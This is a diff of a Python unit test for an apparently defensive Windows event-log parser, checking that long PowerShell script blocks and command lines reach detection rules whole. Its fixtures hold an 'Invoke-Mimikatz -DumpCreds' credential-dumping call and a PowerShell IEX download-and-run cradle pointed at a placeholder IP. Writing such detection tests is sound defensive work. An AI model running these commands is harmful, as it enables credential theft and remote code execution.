@@ -168,8 +168,12 @@ def test_long_command_lines_and_script_blocks_reach_the_rules_whole():
     """An indicator placed after character 4,000 of a command line or script block escaped every
     rule. The rule-searched columns keep the whole text up to 64 KiB."""
     script = "# " + "x" * 5000 + "\nInvoke-Mimikatz -DumpCreds"
-    row = evtx_parser.flatten(_sample_event(4104, "Microsoft-Windows-PowerShell", {"ScriptBlockText": script, "MessageNumber": 1, "MessageTotal": 1}), None, include_raw=False)
+    row = evtx_parser.flatten(
+        _sample_event(4104, "Microsoft-Windows-PowerShell", {"ScriptBlockText": script, "MessageNumber": 1, "MessageTotal": 1}), None, include_raw=False
+    )
     assert row["scriptBlockText"] == script
     cmd = "powershell.exe " + "-NoP " * 900 + "IEX (New-Object Net.WebClient).DownloadString('http://198.51.100.7/a')"
-    row = evtx_parser.flatten(_sample_event(1, "Microsoft-Windows-Sysmon", {"Image": "C:\\Windows\\powershell.exe", "CommandLine": cmd}), None, include_raw=False)
+    row = evtx_parser.flatten(
+        _sample_event(1, "Microsoft-Windows-Sysmon", {"Image": "C:\\Windows\\powershell.exe", "CommandLine": cmd}), None, include_raw=False
+    )
     assert row["commandLine"] == cmd and len(cmd) > 4000
